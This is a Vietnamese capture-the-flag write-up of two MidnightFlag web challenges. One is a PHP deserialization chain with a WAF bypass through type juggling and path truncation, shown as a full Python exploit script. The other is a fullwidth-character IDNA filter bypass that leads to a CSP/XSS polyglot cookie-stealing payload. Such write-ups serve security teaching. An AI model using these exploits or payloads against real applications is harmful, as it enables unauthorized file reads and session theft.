---
title: MidnightFlag CTF
description: top xx
date: 2026-xx-xx 00:00:00+0000
image: image.png
categories:
    - CTF
tags:
    - PHP Deserialization
    - Type Juggling
    - Magic Methods
    - Path Traversal
    - Path Truncation
    - WAF Bypass
    - XSS
    - CSP Bypass
    - IDNA Normalization
    - Polyglot
weight: 25
---

## Clash Of Flans [P1c0L0]
![image](https://hackmd.io/_uploads/H1em4VGqbe.png)
![image](https://hackmd.io/_uploads/H1-VNVGcZg.png)

- Đọc file `src/index.php` ta thấy tại đây ứng dụng khởi tạo một session người chơi (Baker) và lưu thông tin các Flan vào Cookie dưới dạng serialize
`$data = unserialize(getCookie("flans"));`
![image](https://hackmd.io/_uploads/HkYnENz5bg.png)

- Có thể coi đây là dấu hiệu của PHP insecure deserialization. Nhưng chall này có một lớp WAF là hàm `is_bad()` 
- Hàm này sẽ kiểm tra xem payload của ta có chứa 2 keyword là `Clash` và `Baker` không

![image](https://hackmd.io/_uploads/HyjT44z5Zl.png)
![image](https://hackmd.io/_uploads/BJz0NNMcZe.png)

- Ban đầu tôi đã thử bypass bằng cách viết thường tên `class` vì `class` trong PHP không phân biệt hoa thường
- Nhưng vì server chạy linux (file system case-sensitive) và sử dụng hàm `spl_autoload_register`  tự động nối chuỗi tạo tên file nên việc gọi class `flan` hay `clash` sẽ làm autoloader bị crash do không tìm thấy `flan.php` => phải dùng đúng chữ hoa (`Flan`, `Clash`, `Baker`)

![image](https://hackmd.io/_uploads/HJC7rVzcWx.png)

- Thay vì gửi cookie ở dạng string `flans=payload` thì ta gửi dạng mảng thông qua header: `Cookie: flans[0]=payload`
- Khi `$param` là một mảng, hàm `strpos()` trong php7.4 sẽ báo Warning và trả về giá trị `null`
- Theo phép so sánh `null != false` sẽ bị cho là `false` => giúp ta bypass vòng lặp check an toàn
- Khi vào hàm `getCookie()` mảng sẽ được đưa qua hàm `flatten()` để gộp `implode(",", $param)` trở lại thành chuỗi serialize nguyên vẹn

![image](https://hackmd.io/_uploads/S1a-U4Gcbl.png)
![image](https://hackmd.io/_uploads/BykXL4f5Ze.png)

### Chain
- Chèn một chuỗi object giả để từ đó dùng các Magic method của PHP
    - Trigger `__destruct`: file `src/Flan.php` chứa hàm huỷ sẽ in ra màn hình `echo "\n";`
    - `__toString`: bằng cách set `$this->name` thành một object của class `Clash` thì PHP sẽ ép kiểu object về chuỗi, tự động gọi `Clash::__toString()`
    - `__get`: trong `Clash::__toString()` nó gọi `getSummary()` có đoạn xử lý: `$side = getParam("side");` và truy xuất `$this->flan1->$side`. Nếu ta truyền biến HTTP GET `?side=ClashSummaryByUuid` và ép `$this->flan1` thành object `Baker` PHP sẽ gọi magic method `Baker::__get("ClashSummaryByUuid")` vì property này không tồn tại
    - Tại `Baker::__get()` biến `$args` được lấy từ tham số `?args=` và ứng dụng sẽ gọi động `call_user_func_array(array($this, "get" . $name), $args);`. Điều này dẫn thẳng luồng thực thi đến hàm `Baker::getClashSummaryByUuid($args[0])` với tham số do ta kiểm soát

### Path truncation magic
- Hàm đọc file có đoạn code:
```php!
$file = joinpath($CLASH_DIR . '/' . $uuid . '.cof');
$file = substr($file, 0, 100); 
if (file_exists($file)) { return file_get_contents($file); }
```

- `$CLASH_DIR` là records
- Biến `$uuid` (payload) bị kẹp giữa `records/` và đuôi `.cof`
- Hàm `substr($file, 0, 100)` cắt chuỗi thành 100 ký tự
=> ta cần đọc file `/flag.txt` nên ta cần chuỗi dài đúng 100 byte sao cho ký tự cuối cùng là chữ t của `.txt` từ đó làm rụng phần `.cof` đi

- Sau khi hàm `joinpath` xử lý, `/records/../` sẽ triệt tiêu nhau, để lại chuỗi bắt đầu từ root `/`. Mỗi lần lùi thư mục `../` tốn 3 ký tự. Ta sử dụng đường dẫn symlink nội tại của linux `/proc/thread-self/root/` trỏ ngược về thư mục gốc để độn độ dài

- Payload: `../ x 17 lần` + `proc/thread-self/root/proc/thread-self/root/flag.txt`
- Trừ 1 lần `../` để vô hiệu hóa `records/`
- Còn lại 16 lần `../` = 48 ký tự.
- Chuỗi symlink padding `proc/thread-self/root/proc/thread-self/root/flag.txt` = 52 ký tự

=> 48 + 52 = đúng 100 ký tự

### Full script exploit
```python!
import urllib.parse
import requests
import re

url = "http://dyn-01.midnightflag.fr:14922/"

# 1. Payload Object Injection sử dụng chuẩn xác Class Name
# Null bytes \x00*\x00 dùng cho các thuộc tính Protected.
raw_payload = (
    'a:1:{s:5:"flans";a:1:{i:0;'
    'O:4:"Flan":1:{s:7:"\x00*\x00name";'
    'O:5:"Clash":4:{'
    's:8:"\x00*\x00flan1";O:5:"Baker":1:{s:7:"\x00*\x00name";s:5:"baker";}'
    's:8:"\x00*\x00flan2";O:4:"Flan":1:{s:7:"\x00*\x00name";s:5:"dummy";}'
    's:13:"\x00*\x00winnerName";s:3:"win";'
    's:16:"\x00*\x00resultDetails";s:3:"det";}}}}'
)
encoded_cookie = urllib.parse.quote(raw_payload)

# 2. Path Truncation payload (Đúng 100 chars, chém gọn đuôi .cof)
uuid_payload = "../" * 17 + "proc/thread-self/root/proc/thread-self/root/flag.txt"

params = {
    'baker_name': 'pwned',              
    'side': 'ClashSummaryByUuid',       
    'args': uuid_payload                
}

# 3. Gửi Payload qua Header Cookie (Sử dụng flans[0] để Type Juggling WAF)
headers = {
    'Cookie': f'flans[0]={encoded_cookie}'
}

print("[*] Fire the hole...")
r = requests.get(url, params=params, headers=headers)

# 4. Trích xuất cờ bị in ẩn dưới dạng HTML comment
flag_match = re.search(r'MCTF\{.*?\}', r.text)
if flag_match:
    print(f"\n[+] BINGO! Flag: {flag_match.group(0)}")
```

**FLAG: MCTF{7hr33-ch4rs_pr0bl3m}**


## Forbidden Script Ritual [P1c0L0]
![image](https://hackmd.io/_uploads/SkU-erfqWx.png)
![image](https://hackmd.io/_uploads/S1lfeBMcZe.png)
### Recon
- Ritual app: ứng dụng web nhận tham số từ user và render ra trang HTML kèm cấu hình CSP
- Ritual bot: con bot mô phỏng admin, nó sẽ set cookie `FLAG=MCTF{}` tại domain `http://ritual-app:5000/` sau đó truy cập vào URL do ta cung cấp. Nếu URL của ta có thể trigger XSS (VD: `console.log(document.cookie)`) bot sẽ capture log và trả về qua socker

### Review
- Ở `app.py`, ứng dụng nhận tham số `domain` qua GET request và xử lý như sau:
![image](https://hackmd.io/_uploads/Bkx6xHM9Wl.png)
- Sau đó biến `csp_domain_frame` được reflect vào 2 sinks
    - Sink 1: trong body HTML (tag `<script>`)
    ![image](https://hackmd.io/_uploads/S1IxWSG9Wg.png)
    - Sink 2: trong HTTP header (CSP)
    ![image](https://hackmd.io/_uploads/rk9ZZHG9be.png)

### Exploit
#### Bypass filter (IDNA normalization bug)
- Hàm `validate_url` block các ký tự quan trọng để XSS `"`, `'`, `;`, `<`. Nhưng sau khi qua filter, hostname lại bị đẩy qua hàm `.encode("idna").decode()`
![image](https://hackmd.io/_uploads/S1y_bSfcZl.png)

- IDNA sử dụng chuẩn NFKC normalization. Điều này nghĩa là các ký tự unicode dạng fullwidth (chiếm 2 byte) sẽ bị ép về dạng ascii halfwidth tiêu chuẩn
    - Ký tự `＂` (U+FF02) ➜ normalized thành `"`
    - Ký tự `；` (U+FF1B) ➜ normalized thành `;`
    - Ký tự `＇` (U+FF07) ➜ normalized thành `'`

=> Ta có thể bypass mảng `FORBIDDEN_CHARS` bằng cách truyền vào các ký tự fullwidth, server sẽ nhận nó là an toàn nhưng khi encode IDNA, nó sẽ biến thành các payload và in ra HTML/header

#### XSS + CSP bypass
- Vì biến `csp_domain_frame` được reflect vào cả tag `<script>` và header CSP, ta gặp một vấn đề lớn là bypass CSP sẽ làm chết JS và giữ JS sống thì bị chặn bởi CSP
- Header mặc định: `Content-Security-Policy: frame-ancestors https://{payload} ; script-src 'self';`
- Để chạy được inline JS ta phải inject `;script-src 'unsafe-inline'` vào payload thì khi đó
    - Header thành: `Content-Security-Policy: frame-ancestors https://a.";script-src 'unsafe-inline' ; script-src 'self';` => hợp lệ, trình duyệt sẽ nhận `unsafe-inline` và bỏ qua self
    - Nhưng trong JS
    ``` javascript
    const allow_domain = "frame-ancestors https://a.";script-src 'unsafe-inline';
    ```
- Đoạn `script-src 'unsafe-inline'` trong JS là syntax error. JS engine sẽ báo `Unexpected string` và dừng thực thi. Payload XSS sẽ không chạy được

#### Polyglot
- Ta cần một cú pháp vừa hợp lệ trong CSP header, vừa không gây syntax error trong JS. Cách giải quyết là sử dụng một biến giả và toán tử Bitwise OR `|`
```javascript!
var script=1; var src=1; script-src | 'unsafe-inline'; console.log(document.cookie);
```

- Từ phía browser duyệt CSP: khi gặp `script-src | 'unsafe-inline'` trình duyệt thấy `|` là một invalid source, nó sẽ in ra cảnh báo ở console và bỏ qua, sau đó tiếp tục đọc và áp dụng `'unsafe-inline'` => CSP bypass
- Từ phía JS engine: nó coi đây là khai báo 2 biến script và src. Cụm `script-src | 'unsafe-inline'` là một phép toán trừ (`1 - 1`) sau đó OR bitwise với chuỗi (ép kiểu). Valid syntax, không có lỗi nào được throw ra. Hàm `console.log` phía sau sẽ được chạy ngon


#### Payload
- Ta sẽ cấu trúc chuỗi hostname như sau
`a.";var script=1;var src=1;script-src | 'unsafe-inline';console.log(document.cookie);var dummy="`

- Chuyển đổi các ký tự nhạy cảm sang fullwidth và thêm fullwidth space để urlparse không bị đứt đoạn:
    - `"` ➜ `%EF%BC%82`
    - `;` ➜ `%EF%BC%9B`
    - ` ` (space) ➜ `%E3%80%80`
    - `'` ➜ `%EF%BC%87`

- Payload raw URL:
`http://a.%EF%BC%82%EF%BC%9Bvar%E3%80%80script=1%EF%BC%9Bvar%E3%80%80src=1%EF%BC%9Bscript-src%E3%80%80|%E3%80%80%EF%BC%87unsafe-inline%EF%BC%87%EF%BC%9Bconsole.log(document.cookie)%EF%BC%9Bvar%E3%80%80dummy=%EF%BC%82`

![image](https://hackmd.io/_uploads/ry5nNHGcZg.png)

**FLAG: MCTF{d28ba1ed8b0d74195002b2844e16d4df}**